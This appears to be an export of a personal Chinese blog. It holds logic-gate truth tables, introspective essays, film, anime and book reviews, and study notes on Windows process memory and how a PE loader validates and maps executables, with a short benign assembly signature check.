<p><a href="/wiki/File:IEC_NOR.svg" title="NOR"><img src="//upload.wikimedia.org/wikipedia/commons/thumb/3/37/IEC_NOR.svg/128px-IEC_NOR.svg.png" alt="NOR" /></a></p>
<p>“或非”门╱“反或”闸╱“非或”闸╱“反或”闸</p>
<p>所有输入为低时，才会有高的输出。</p>
<p>一高出低。</p>
<p>A + B ¯ {\displaystyle {\overline {A+B}}} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/08840f8e2022f127fc459d801a8f8ce93f65f55a" alt="" /></p>
<p><strong>输入</strong></p>
<p><strong>输出</strong></p>
<p>A</p>
<p>B</p>
<p>A</p>
<p>NOR</p>
<p>B</p>
<p>0</p>
<p>0</p>
<p>1</p>
<p>0</p>
<p>1</p>
<p>0</p>
<p>1</p>
<p>0</p>
<p>0</p>
<p>1</p>
<p>1</p>
<p>0</p>
<p><strong><a href="/wiki/%E5%BC%82%E6%88%96%E9%97%A8" title="异或门">XOR</a></strong></p>
<p><a href="/wiki/File:XOR_ANSI.svg" title="XOR"><img src="//upload.wikimedia.org/wikipedia/commons/thumb/0/01/XOR_ANSI.svg/128px-XOR_ANSI.svg.png" alt="XOR" /></a></p>
<p><a href="/wiki/File:IEC_XOR.svg" title="XOR"><img src="//upload.wikimedia.org/wikipedia/commons/thumb/d/dd/IEC_XOR.svg/128px-IEC_XOR.svg.png" alt="XOR" /></a></p>
<p>“异或”门╱“异或”闸</p>
<p>只有其中一个输入为高时，输出为高；否则为低。</p>
<p>A ⊕ B {\displaystyle A\oplus B} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/f0512d6bdd29ff000dea0bf68b853618dcaabc3e" alt="AB" /></p>
<p><strong>输入</strong></p>
<p><strong>输出</strong></p>
<p>A</p>
<p>B</p>
<p>A</p>
<p>XOR</p>
<p>B</p>
<p>0</p>
<p>0</p>
<p>0</p>
<p>0</p>
<p>1</p>
<p>1</p>
<p>1</p>
<p>0</p>
<p>1</p>
<p>1</p>
<p>1</p>
<p>0</p>
<p>XOR闸 (exclusive-OR) 的输出为1只有当两个输入是不同的状态；反之当两者输入为相同的，输出为0，不论输入为0或1。如果有超过两个输入的话，当输入端为1的数目是奇数。实际使用上，这些闸是由更基本的逻辑门组合成的。</p>
<p><strong><a href="/wiki/%E5%90%8C%E6%88%96%E9%97%A8" title="同或门">XNOR</a></strong></p>
<p><a href="/wiki/File:XNOR_ANSI.svg" title="XNOR"><img src="//upload.wikimedia.org/wikipedia/commons/thumb/d/d6/XNOR_ANSI.svg/128px-XNOR_ANSI.svg.png" alt="XNOR" /></a></p>
<p><a href="/wiki/File:IEC_XNOR.svg" title="XNOR"><img src="//upload.wikimedia.org/wikipedia/commons/thumb/5/59/IEC_XNOR.svg/128px-IEC_XNOR.svg.png" alt="XNOR" /></a></p>
<p>“同或”门╱“反异或”闸╱“互斥反或”闸╱“异或非”闸</p>
<p>只有其中一个输入为高时，输出为低；否则为高。</p>
<p>A ⊕ B ¯ {\displaystyle {\overline {A\oplus B}}} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/6a925c0f94e91b108609068c5ceae7c671db84d9" alt="" /></p>
<p>或 A ⊙ B {\displaystyle {A\odot B}} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/d6c5d00749f865e6799422873f3564ffccfc7105" alt="{A B}" /></p>
<p><strong>输入</strong></p>
<p><strong>输出</strong></p>
<p>A</p>
<p>B</p>
<p>A XNOR</p>
<p>B</p>
<p>0</p>
<p>0</p>
<p>1</p>
<p>0</p>
<p>1</p>
<p>0</p>
<p>1</p>
<p>0</p>
<p>0</p>
<p>1</p>
<p>1</p>
<p>1</p>
<p><strong><a href="/wiki/%E7%B7%A9%E8%A1%9D%E9%96%98" title="缓冲闸">BUF</a></strong></p>
<p><a href="/wiki/File:Buffer_ANSI.svg" title="NOT"><img src="//upload.wikimedia.org/wikipedia/commons/thumb/7/79/Buffer_ANSI.svg/128px-Buffer_ANSI.svg.png" alt="NOT" /></a></p>
<p><a href="/wiki/File:Buffer_IEC.svg" title="NOT"><img src="//upload.wikimedia.org/wikipedia/commons/thumb/a/a7/Buffer_IEC.svg/100px-Buffer_IEC.svg.png" alt="NOT" /></a></p>
<p>“是”门╱同相器╱“同”闸╱中继器</p>
<p>输出一个与输入相同的高低状态。</p>
<p>A {\displaystyle A} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/7daff47fa58cdfd29dc333def748ff5fa4c923e3" alt="A" /></p>
<p><strong>输入</strong></p>
<p><strong>输出</strong></p>
<p>A</p>
<p>BUF A</p>
<p>0</p>
<p>0</p>
<p>1</p>
<p>1</p>
<p><strong><a href="/wiki/%E8%98%8A%E5%90%AB%E9%96%98" title="蕴含闸">IMPLY</a></strong></p>
<p><a href="/wiki/File:IMPLY_ANSI.svg" title="XNOR"><img src="//upload.wikimedia.org/wikipedia/commons/thumb/c/cc/IMPLY_ANSI.svg/128px-IMPLY_ANSI.svg.png" alt="XNOR" /></a></p>
<p><a href="/wiki/File:IEC_Implies_gate.svg" title="XNOR"><img src="//upload.wikimedia.org/wikipedia/commons/thumb/4/41/IEC_Implies_gate.svg/170px-IEC_Implies_gate.svg.png" alt="XNOR" /></a></p>
<p>“蕴含”门╱“蕴含”闸</p>
<p>如果第一输入为低时，输出高，否则输出与第二输入相同的高低状态。</p>
<p>A → B {\displaystyle A\to B} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/d5b8dd84619daff17b52a08b77d15db2b9ad6c2a" alt="AB" /></p>
<p><strong>输入</strong></p>
<p><strong>输出</strong></p>
<p>A</p>
<p>B</p>
<p>A IMPLY B</p>
<p>0</p>
<p>0</p>
<p>1</p>
<p>0</p>
<p>1</p>
<p>1</p>
<p>1</p>
<p>0</p>
<p>0</p>
<p>1</p>
<p>1</p>
<p>1</p>
<p><strong><a href="/wiki/%E8%98%8A%E5%90%AB%E9%96%98#蘊含非閘" title="蕴含闸">NIMPLY</a></strong></p>
<p><a href="/wiki/File:NIMPLY_(AND)_ANSI.svg" title="NIMPLY"><img src="//upload.wikimedia.org/wikipedia/commons/thumb/7/73/NIMPLY_%28AND%29_ANSI.svg/128px-NIMPLY_%28AND%29_ANSI.svg.png" alt="NIMPLY" /></a></p>
<p><a href="/wiki/File:IEC_Nimplies_gate.svg" title="NIMPLY"><img src="//upload.wikimedia.org/wikipedia/commons/thumb/b/bf/IEC_Nimplies_gate.svg/170px-IEC_Nimplies_gate.svg.png" alt="NIMPLY" /></a></p>
<p>“蕴含非”门╱“蕴含非”闸</p>
<p>如果第一输入为低时，输出低，否则输出与第二输入相反的高低状态。</p>
<p>A → B ¯ {\displaystyle {\overline {A\to B}}} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/0e0a092d5fb1d42d4a24c2129510c3d0a0065146" alt="{}" /></p>
<p>或 ¬ ( a → b ) {\displaystyle \lnot (a\to b)} <img src="https://wikimedia.org/api/rest_v1/media/math/render/svg/4977af4d0c52aca69bc56275e53087de0719b9c0" alt="{(ab)}" /></p>
<p><strong>输入</strong></p>
<p><strong>输出</strong></p>
<p>A</p>
<p>B</p>
<p>A NIMPLY B</p>
<p>0</p>
<p>0</p>
<p>0</p>
<p>0</p>
<p>1</p>
<p>0</p>
<p>1</p>
<p>0</p>
<p>1</p>
<p>1</p>
<p>1</p>
<p>0</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>校内</category>
        <category>计组</category>
      </categories>
  </entry>
  <entry>
    <title>让我成为安虚壬, 步入混乱无序的经历</title>
    <url>/za-tan/fool/</url>
    <content><![CDATA[<p>细节不想提了</p>
<p>自私不会被认为是自私,而是寡言内敛,不高调,值得信赖</p>
]]></content>
      <categories>
        <category>黑历史与垃圾</category>
      </categories>
  </entry>
  <entry>
    <title>可悲</title>
    <url>/za-tan/ke-bei/</url>
    <content><![CDATA[<p>人真正可悲的不是没有金钱，没有能力，或者没有权利</p>
<p>因为这些到最后都还有死路一条</p>
<p>人真正可悲的是没有童年，没有青春</p>
<p>这甚至连死亡都无法弥补</p>
<p>很多事情看破之后，另一些事情就明白许多了</p>
<p>真的很庆幸，在高中的时候遇到了一个真正有资格被称作是人民教师的班主任</p>
<p>但可悲的是, 也就只遇到过这么一个真正想要育人的好老师</p>
<p>回想起来给他写的那些肺腑之言也确实是作词、玩音乐的一个开端</p>
<p>音乐也罢，它对我的历史任务已经完成了</p>
<p><strong>让人成为一个人，而非一头动物的方法，我认为只有涉猎纯粹的，不功利的艺术</strong></p>
<p>一种亲身的经历的氛围，而非任何形式的手艺，也绝非单纯的教育</p>
<p>经历过，融入过，淡然，离场，然后变得更像是一个人了</p>
<p>做事可以为了有用，但不能只为了有用</p>
<p>活着其实就是为了看看没看过的东西, 对自己感兴趣的东西感兴趣</p>
<p>能有真正的热爱居然是我唯一的后盾，完全断裂的社会性关系，没有港口的叶子</p>
<p>也就只能靠自己漂了</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181048207.jpeg" /></p>
]]></content>
      <categories>
        <category>黑历史与垃圾</category>
      </categories>
  </entry>
  <entry>
    <title>大学一年以来的一些经历和感想</title>
    <url>/za-tan/da-xue-yi-nian-yi-lai-de-yi-xie-jing-li-he-gan-xiang/</url>
    <content><![CDATA[<!-- 建议开着此音乐并关闭博客页脚播放器看本文 -->
<p>我这个人是憋不住话的。</p>
<p>一年了，经历了种种之后，终于刺骨地见识到了真实大学生活，以及这样的生活与一个单纯的高三学生眼中的大学生活到底有多么的不同，未来的现实到底有多么的残酷</p>
<p>总想写点什么，说点什么，但是关注我知乎，QQ，网易云的熟人太多，而这些痛彻心扉的教训又都是来自于他们，虽然没有怪罪的意思，反而还挺感谢的，但这样直接发出来被看见的话，总是感觉很尬尴，思来想去，最终发在自己的博客上了</p>
<blockquote>
<p>ねぇどうして 人は生きていかなきゃいけないの<br />
命って何のためにあるの？</p>
</blockquote>
<p>在我11岁那年，《少年电脑世界》对我进行了第一次电脑启蒙，当时立死誓，将自己的一生奉献给游戏行业，误打误撞最终进了信息安全专业，原先就是抱着得过且过的想法，安慰自己说黑客也挺酷的，但是越学，越发现：自己只是觉得黑客，密码学很酷，但是自己根本不是想要天天做这个工作的人，渗透、挖洞，这些对我来说根本无法成为激励自己的动力来源<br />
</p>
<p>我到底是更倾向于一辈子一个人度过还是两个人，如果是后者的话，我能为另一半做到什么程度？我值得被他人温柔对待吗？</p>
<p>如果一条路注定失败，那到底应该是 及时止损 永不涉足 还是一意孤行 毕竟不试就会后悔...</p>
<p>明明有更舒服的路，但却不是自己想要的路</p>
<p>与 "试了，但失败了，而后悔" 相比</p>
<p>不试，虽不会因此失败，但未曾踏足“林子中的另一条路” 或许更会让人后悔和懊恼</p>
<p>这也就是我的兴趣爱好这么的广泛，并且涉足之深度都不能算是浅尝 的最主要原因</p>
<p>或许单身一辈子才是我的最好选择吧。。。</p>
<p>之前说过的话都太幼稚了.....最近两个月经历的社会毒打真的让我重塑了很多方面的价值观，同时也巩固了我曾经的诸多想法</p>
<p>恰逢高考季，这篇文章就算是写给后辈们的了</p>
]]></content>
      <categories>
        <category>黑历史与垃圾</category>
      </categories>
  </entry>
  <entry>
    <title>杂记</title>
    <url>/za-tan/za-ji-2/</url>
    <content><![CDATA[<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172158991.png" /></p>
]]></content>
      <categories>
        <category>黑历史与垃圾</category>
      </categories>
  </entry>
  <entry>
    <title>杂记</title>
    <url>/za-tan/za-ji/</url>
    <content><![CDATA[<p>我也不是多喜欢保持纯粹理性 力求过程正确</p>
<p>我只是喜欢 <strong>喜欢保持纯粹理性</strong> 的感觉</p>
]]></content>
      <categories>
        <category>黑历史与垃圾</category>
      </categories>
  </entry>
  <entry>
    <title>杂记一些感慨</title>
    <url>/za-tan/za-ji-yi-xie-gan-kai/</url>
    <content><![CDATA[<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172200905.png" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172157118.png" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172157254.png" />-</p>
]]></content>
      <categories>
        <category>黑历史与垃圾</category>
      </categories>
  </entry>
  <entry>
    <title>破大防</title>
    <url>/za-tan/po-da-fang/</url>
    <content><![CDATA[<p>玩gal结果看到自己人生的悲惨一面真的破大防 结果还那么的写实, 脚本怎么写的那么真实, 我都怀疑主文案是不是经历过相同经历 是哪个gal就不说了,</p>
]]></content>
      <categories>
        <category>黑历史与垃圾</category>
      </categories>
  </entry>
  <entry>
    <title>谈抽烟</title>
    <url>/za-tan/tan-chou-yan/</url>
    <content><![CDATA[<p>就我个人看来，抽烟目的并不是尼古丁带来的巴多酚，更多的是人类基因当中对火的依赖</p>
<p>在现代社会中，感受孤独的瞬间有很多</p>
<p>周末早上醒来，看到秽涩之图，一时兴起，在毫无意义的上下活塞运动中，一股暖流从身体中喷出，顿感四肢无力，昏睡过去</p>
<p>醒来时透过早上还没拉开的窗帘，发现外面的光线已然昏暗，低头看到一滩纸包着的秽物</p>
<p>四处摸索不得，最终发现被踢到床下的手机上映着的数字平白地表明：下午六点三十二</p>
<p>拾起来，解锁</p>
<p>没有新消息</p>
<p>这和一种情况相类似吧，有的人说二次元越来越多了，这哪是亚文化小群体</p>
<p>但是殊不知，二次元和二次元是不相同的</p>
<p>现代社会的孤独体现在信息的对比上</p>
<p>一方面信息的巨量化（被动接受），另一方面却没有等比例的主动接受来自同路人信息这一选项</p>
<p>抽烟，其实抽的是对火的认同感，暂时免去了信息对比，只接受了火的空洞</p>
<p>这个论断我曾经见过多次，在我抽烟前，抽的不多时，都认为是扯淡</p>
<p>但当我真正经历后，更多觉得是：看破红尘太多也不好</p>
<p>todo list还是得满一些，不然就陷入了一种心理斗争：明明活够了，但为什么还想活着</p>
]]></content>
      <categories>
        <category>黑历史与垃圾</category>
      </categories>
  </entry>
  <entry>
    <title>《narcissu》1，2，终章 点评</title>
    <url>/dian-ping/narcissu-1-2-zhong-zhang-dian-ping/</url>
    <content><![CDATA[<p>最大的感悟就是，将死之人的最大理念也是留下什么，核心应该是传承某一种模因，即使是向死的理念</p>
]]></content>
      <categories>
        <category>杂谈</category>
        <category>点评</category>
        <category>ACG</category>
      </categories>
  </entry>
  <entry>
    <title>《凪明》影评</title>
    <url>/dian-ping/ci-ming-ying-ping/</url>
    <content><![CDATA[<p>第一次看的时候年龄太小了，完全没看懂恋爱情节的核心内容，只是觉得画风很好，绘制精度很高（在当年水准下），有很多用来炫技的水陆交汇场景以及第十二集突然的情节急转，编剧nb，至于恋爱的部分反而倒是其次的，没留下太深印象</p>
<h2 id="正文">正文</h2>
<p>初读不知书中意，再读已是书中人</p>
]]></content>
      <categories>
        <category>杂谈</category>
        <category>点评</category>
        <category>ACG</category>
      </categories>
  </entry>
  <entry>
    <title>《只有我不存在的城市》影评</title>
    <url>/dian-ping/zhi-you-wo-bu-cun-zai-de-cheng-shi-ying-ping/</url>
    <content><![CDATA[<ol type="1">
<li>中国政府欠包括我在内的无数经受黑色童年的孩子一个社会化抚养</li>
<li>需要立碑纪念的无名者不只是英雄</li>
</ol>
]]></content>
      <categories>
        <category>杂谈</category>
        <category>点评</category>
        <category>ACG</category>
      </categories>
  </entry>
  <entry>
    <title>《哈利波特》二周目点评</title>
    <url>/dian-ping/ha-li-bo-te-er-zhou-mu-dian-ping/</url>
    <content><![CDATA[<p>这tm是儿童文学？？</p>
<p>当年看的时候完全没有理解一些内核</p>
<p>这tm明明是隐喻白左与美国右翼党争的政治作品，魔法部后期是左，哈利波特是右</p>
<p>伏地魔隐喻的就是共党</p>
<p>我看完之后还怕搞错了，结果发现网上分析这个的一抓一大把，我这才确定了我的观点</p>
<p>而且情感线的描写小孩真的能看懂？反正我当年没看懂，不过现在我觉得那些描写太真实了，是本人</p>
<p>同时吃设定，吃书，OOC太严重，明明是魔法师非要搞物理攻击，某些人物的性格前后差异太大</p>
<p>单从文学水平来说，唯一值得称赞，且做到几乎完美的部分，只有关于《什么是青春》这个问题的描写</p>
<p>所有可以展现青春的细节的描写，现在看来都太真实了，都是一些再也不会有的经历，纯粹的青春</p>
<p>我只能说，这个系列是夹带私货的，表面迎合了15岁以下青少年的，商业上也认可了这种迎合的，不停吃设定的架空作品</p>
<p>个人点评7.5分，评这个“良好”级别的分数主要原因是青春描写和一些正面价值观的描写，个人认为，这几乎是这个系列当中，真正对青少年有营养的部分，不过还是占比挺大的，而且也确实是核心之一</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172052622.jpeg" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172052294.jpeg" /></p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303172052390.jpeg" /></p>
]]></content>
      <categories>
        <category>杂谈</category>
        <category>点评</category>
      </categories>
      <tags>
        <tag>电影</tag>
        <tag>点评</tag>
        <tag>有剧透</tag>
      </tags>
  </entry>
  <entry>
    <title>《李鸿章传》一些感悟</title>
    <url>/dian-ping/li-hong-zhang-chuan-yi-xie-gan-wu/</url>
    <content><![CDATA[<p>感悟最深的是一小段描写，大意如下（摘录，并非代表笔者的观点）</p>
<p>封建社会时期的中国社会当中，比较有远见的高官往往会善待自己的厨子，还时不时发发奖金，放放假什么的（这可是没有工会的旧社会）</p>
<p>因为这种底层老百姓的怨气往往比较重，受劳比较多，如果还对待他们不好，往往会对主子有怨气</p>
<p>如果是洗衣服的仆人，倒也还好，如果是厨子的话，说不定就给主子下毒了</p>
<h2 id="正文">正文</h2>
<p>善待______</p>
]]></content>
      <categories>
        <category>杂谈</category>
        <category>点评</category>
      </categories>
  </entry>
  <entry>
    <title>《波斯语课》影评</title>
    <url>/dian-ping/bo-si-yu-ke-ying-ping/</url>
    <content><![CDATA[<p>（无剧透）</p>
<h2 id="总述">总述</h2>
<p>看过的第一部<strong>造语</strong>相关的电影</p>
<h2 id="简介">简介</h2>
<p>男主犹太人伪装成波斯人身份逃过某次二战犹太人大屠杀，然后在劳改营教军官波斯语（下文简称波斯语军官），但其实男主一句波斯语都不会，为了求生便创造了一门体系完整的造语伪装成波斯语，所有单词都是来自于劳改营当中被杀死的犹太人，然而每天过目劳改营犯人的军官却从未发现；之后的剧情就涉及剧透了，简介到此为止</p>
<h2 id="影评">影评</h2>
<p>刻画真实的战争片有很多，这部电影给了我耳目一新的感觉，尤其是多线叙事人物关系，除男主外其他主要人物的人物关系刻画真的是太细致了</p>
<p>各路高级军官都在野餐的时候，波斯语军官居然在给其他军官上餐，明明餐桌上还有不少平级的军官，他居然在做这种打杂的事情</p>
<p>再比如说，军队威信的塑造；“找到犹太人赏十个罐头”，但是波斯语军官只给了两个，一句话也没说，然后就然找到“波斯人”的士兵走，而这个士兵也很识相，居然看出来这个军官其实是想要先确认他是不是正牌的波斯人，等到完全相信这个人是波斯人之后为了树立威望，“我是个守信的人”，然后给了八个罐头，看着那个士兵惊讶的表情，又给了一瓶酒</p>
<p>在当时那个年代和环境，能够掏心窝的说话的人真的是比什么都要贵，如果理解不了这句话，可以想象一下现在这种和平稳定年代，屏幕前的你又有多少可以掏心窝的人，但是这个军官在谈及自己学波斯语的原因时，掏心窝说了很多话，这里我不是想洗法西斯，我只是想说，没有人能逆环境；后面还有一段描写，为什么加入纳粹，那个军官答道，只是因为一群纳粹人穿的很帅，谈笑风生，然后我也去搭讪了；也可以佐证“ 没有人能逆环境 ”这一点；倾诉对象的身份不是重点，而是对象的本身，有了一个倾诉对象；换句话来说，人本主义；这也是我的价值观当中最推崇的</p>
<p>暂时没有想写的了</p>
]]></content>
      <categories>
        <category>杂谈</category>
        <category>点评</category>
      </categories>
      <tags>
        <tag>电影</tag>
        <tag>点评</tag>
        <tag>无剧透</tag>
      </tags>
  </entry>
  <entry>
    <title>《真实之泪》影评</title>
    <url>/dian-ping/zhen-shi-zhi-lei-ying-ping/</url>
    <content><![CDATA[<p>青春物语的内核都不是给青春期的学生看的</p>
<p>不过从某种意义上来说，受众范围广的作品确实很适合作为广为流传的经典</p>
<p>看青春剧就总是有一种，觉得曾经的自己很悲哀的感觉，不论是机遇上的还是自身能力上的，抑或是行为处事太天真，看到悲剧（某种意义上）的主人公就像曾经的自己真的很悲哀</p>
<p>本剧还有一点很深刻的感悟</p>
<p>客观的话语不能在主观的环境下说出</p>
<p>这里的不能指的是社会性不能</p>
<h2 id="补充1">补充1</h2>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181100065.png" /></p>
<p>这个挺真实的2333</p>
<p>个人经验来说，意外看到女生裸体的话，我觉得还是有相当一部分（即使处于青春期的）男生，和男主这种反应差不多，我之前也差不多是这个反应，然后对方和女主反应也差不多</p>
<p>大部分番当中的尖叫，现实中感觉不太可能（如果对方也意识到是不可抗力的话）</p>
<p>这个算是唯一一个我看过的番里面，没有尖叫的233</p>
]]></content>
      <categories>
        <category>杂谈</category>
        <category>点评</category>
        <category>ACG</category>
      </categories>
  </entry>
  <entry>
    <title>《让子弹飞》影评</title>
    <url>/dian-ping/rang-zi-dan-fei-ying-ping/</url>
    <content><![CDATA[<p>能让人有过度解读欲望的艺术作品才能算是完满的艺术作品，才有资格被称作是艺术，这是我至始至终对艺术一词的看法</p>
<p>但这不意味着艺术作品应当脱离创作者的主观意愿被过度解读</p>
<p>《让子弹飞》便是一个典型</p>
]]></content>
      <categories>
        <category>杂谈</category>
        <category>点评</category>
      </categories>
  </entry>
  <entry>
    <title>番剧: 22/7 点评(无剧透)</title>
    <url>/dian-ping/fan-ju-22-7-dian-ping/</url>
    <content><![CDATA[<p>对于一部偶像番来说, 内核做的足够深, 超出了偶像番的普遍要求, 有几个点最让我感慨, 虽然我平时生活中并不完全是这样想的</p>
<ol type="1">
<li>大人就是要做不想做的事情, 扫自家雪是本分, 扫他家雪才能获得报酬</li>
<li>通过(卖肉)等方式获得的人气和粉丝, 算是真正的人气吗(之前听某个曾经很喜欢的up说过类似的话, 他当时给自己的约定就是视频里面不骂人不说脏话, 我也是因为这点关注他的, 后来逐渐会说一些脏话, 到最后越来越多, 同时底下评论区刷烂梗的也越来越多, 可以说是上面那句台词的真实映照了, 不过他现在也不怎么说脏话了, 好像是因为有了孩子的缘故)</li>
<li>对墙壁的质疑(不剧透)</li>
<li>"我这么做是因为, 如果我不这么做, 我内心深处的东西会受到损害" 很多时候有些事情不是想做才去做的, 而是因为不做会过意不去</li>
</ol>
<p>另外某场景的哭戏(不剧透), CV配音很好, 作画也很好, 可以说是见过的最真实的哭戏配音和作画了, 脸上不规则的皱纹和扭曲的肌肉的细节都表现出来了</p>
<p>所有的氛围塑造都不是强行的, 很珍贵, 现在不做无病呻吟的番其实不太多了</p>
<p>其实还有一个点让我特别感慨, 但是很剧透, F12检查元素查看:</p>
<!-- 墙壁说让她们解散什么的都是为了观察, 这个其实很重要, 大家可以想想看, 如果现在让你写出所有的生活动力, 起床的动力, 你能写出几条, 在我看来, mio作为团队里最像普通人的那一个, 其实在加入227之后, 生活的大部分动力都是227, 这时候解散, 就相当于抽离一个生活动力, 现实中很多人都有这样的经历, 很多自杀的人就是因为唯一的生活动力被抽离了, 比如最近几年的各种研究生自杀事件, 这点上我是比较幸运的, 我生活的动力比较多, 但是世界上仍然有大量不幸运的人, 只有一两个摇摇欲坠的生活动力, 一旦抽离, 只能选择自杀 -->
]]></content>
      <categories>
        <category>ACG</category>
      </categories>
      <tags>
        <tag>点评</tag>
        <tag>无剧透</tag>
        <tag>ACG</tag>
        <tag>番剧</tag>
      </tags>
  </entry>
  <entry>
    <title>音乐《Ascent》点评</title>
    <url>/dian-ping/yin-le-ascent-dian-ping/</url>
    <content><![CDATA[<p>链接：https://music.163.com/song?id=1865086956&amp;userid=476972634</p>
<p>每一小片段的分割很顺畅，过度出每一小片的离调写的刚刚好，不和谐音程既不会跨度太大导致宁静的意境全无，又不会跨度太小使得让人感觉只是小片chant，而非淡出小片</p>
<p>有一个很亮点的地方是，用钢琴踏板的机械音和琴键按下时的键盘音来烘托安静的氛围，而且很明显能感觉到，这部分的声音后期调大了，让人感觉是实体乐器演奏（虽然MIDI钢琴也能做到这一点就是了）</p>
<p>这点真的听的太爽了</p>
<p>以前我一直是极力避免，现在看来，艺术确实不能拘泥于形式</p>
]]></content>
      <categories>
        <category>杂谈</category>
      </categories>
  </entry>
  <entry>
    <title>程序:从静态文件到装载为进程</title>
    <url>/bian-yi-lian-jie-zhuang-zai/pe-loader/</url>
    <content><![CDATA[<h2 id="正文">正文</h2>
<p>什么是进程？当我们提到进程的时候，其实就是这个进程所对应的主要程序，及其所需要的程序外部资源、代码等</p>
<p>比如一个调用了MessageBoxW API的程序在运行时会向外部dll进行查找，进程也应当包含被查找的外部资源对象等</p>
<p>我们都知道，每个进程都有一个属于自己的独立的4GB的虚拟空间；如果从0000 0000开始计数的话，4GB对应为FFFF FFFF，但实际上这片空间并不是平权的，大致可以分为：</p>
<p><img src="https://static.zhishibox.net/20210315/image_109593497.png" /></p>
<p>如果只是死记硬背这些数值的话，倒也没什么意义</p>
<p>这里记录一下困扰笔者的一点：</p>
<p>空指针赋值区原则上来说只需要0000 0000地址处为0就足够所有程序使用了；防止越界的禁入区原则上来说44kb也够用了；就算是为了安全考虑，64kb大小的NULLptr空间，未免也太过冗余了吧；经查，这与<strong>分配粒度</strong>，<strong>字节对齐</strong>等有关，网上大部分资料指向Window核心编程的相关章节；经查该章节及其前后部分并未说明<strong>分配粒度</strong>的定义，同时<strong>分配粒度</strong>一词并无维基百科词条，进而在看雪、52上搜索，找到一篇远古文章，原文链接如下</p>
<p>https://web.archive.org/web/20110117113240/http://blog.ednchina.com/colinluan/238299/message.aspx#78067</p>
<p>"若仅仅解释为<strong>对齐需要</strong>的话，64kb也未免有些太大了"；经查，这一操作是为了向后兼容，防止由于各种原因需要在用户模式区之前加入一小段机器码，因此<strong>缺省对齐值大于最小合法对齐值</strong></p>
<p>需要特别提及的一点是，64kb禁入区在MMU内部映射表中，不指向任何实际的物理内存区块</p>
<p>每个进程独立的虚拟空间，只有低2G区域，高2G区域的内核段是所有程序共用的，操作系统需要在这部分区域中加载各类dll以及其他外部资源</p>
<p>所有的进程都是由其他进程创建的，第一个进程（PID==0）是由操作系统内核创建的</p>
]]></content>
      <categories>
        <category>笔记</category>
        <category>开发</category>
        <category>编译原理</category>
      </categories>
      <tags>
        <tag>装载</tag>
        <tag>编译</tag>
        <tag>进程</tag>
        <tag>动态内存</tag>
      </tags>
  </entry>
  <entry>
    <title>PE loader如何判断PE文件确实是一个PE文件？</title>
    <url>/bian-yi-lian-jie-zhuang-zai/pe-loader-ru-he-pan-duan-pe-wen-jian-que-shi-shi-yi-ge-pe-wen-jian/</url>
    <content><![CDATA[<p>只会进行四步判定就默许为PE文件，如果这种默许出现了其他错误，会在遇到非法指令时掷错退出并认为这是一个编译等过程出现一定错误的PE文件（还是PE文件）</p>
<p>第一步，扩展名是否为exe</p>
<p>第二步，文件头是否为MZ</p>
<p>第三步，003Ch处（e_lfanew）的数据是否为一个合法虚拟地址</p>
<p>第四步，e_lfanew的地址指向的内容是否为IMAGE_NT_SIGNATURE</p>
<p>上述过程在PE loader中一部分源码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">assume esi:ptr IMAGE_DOS_HEADER</span><br><span class="line">.if [esi].e_magic != IMAGE_DOS_SIGNATURE</span><br><span class="line">jmp _ErrFormat</span><br><span class="line">.endif</span><br><span class="line">add esi,[esi].e_lfanew</span><br><span class="line">assume esi:ptr IMAGE_NT_HEADERS</span><br><span class="line">.if [esi].Signature != IMAGE_NT_SIGNATURE</span><br><span class="line">jmp _ErrFormat</span><br><span class="line">.endif</span><br><span class="line">invoke _ProcessPeFile,@lpMemory,esi,@dwFileSize</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>笔记</category>
        <category>存档</category>
      </categories>
  </entry>
  <entry>
    <title>PE loader装载时做的部分工作、导入表、导出表</title>
    <url>/bian-yi-lian-jie-zhuang-zai/pe-loader-zhuang-zai-shi-zuo-de-bu-fen-gong-zuo-dao-ru-biao-dao-chu-biao/</url>
    <content><![CDATA[<h2 id="背景">背景</h2>
<p>假设我们在源码中CALL MessageBox，编译之后的静态机器码是什么？装载之后动调时的机器码又是什么？</p>
<h2 id="正文">正文</h2>
<p>首先， MessageBox 作为导入函数，其实现是封装在dll内的，而编译器在静态编译时并不能动态的获取动态链接库（dll）的地址，所以在PE文件的静态机器码层面，编译器只能给出函数名这一结果，给出方式就是导入表</p>
<p>顺便补一个RVA的笔记</p>
<p>对于RVA需要注意的的一点：他是基于装载后内存空间的，而非基于静态文件的，比如</p>
<p><img src="https://raw.githubusercontent.com/Valkierja/ALLPIC/main/img/202303181056171.png" /></p>
<p>从这张图可以看到，.text的RVA为1000h,换句话来说就是AA 401000h ,但是实际上相对于头的静态文件偏移是RAW偏移</p>
<p>也就是400h</p>
<p>从这点也能看出PE loader的一个特点：装载这一动作并非单纯按部就班的加载磁盘文件，而是会基于PE头当中的信息进行一些额外操作，比如安排各种节区的动态位置</p>
<p>这就要提到重定位表了，不过话题先回到导入表</p>
<p>如果我们在<strong>动调中</strong>去查看call MessageBox的地址，会发现他指向地址以0040h开头的区域，该区域属于EXE程序自身模块，如果跟入，会发现一个far jmp，如果跟跳，便会来到MessageBox的真正入口点</p>
<p>我们记下这个call的地址，在测试程序中，这一地址为00402008h</p>
<p>我们先需要用RVA换算虚拟地址所属区域，可以发现RVA值为2008h，属于.rdata，再查PE头当中记录的数据，得到对应静态文件的偏移值也就是608h——虽然段起始地址变了，但是偏移没变，都是8h</p>
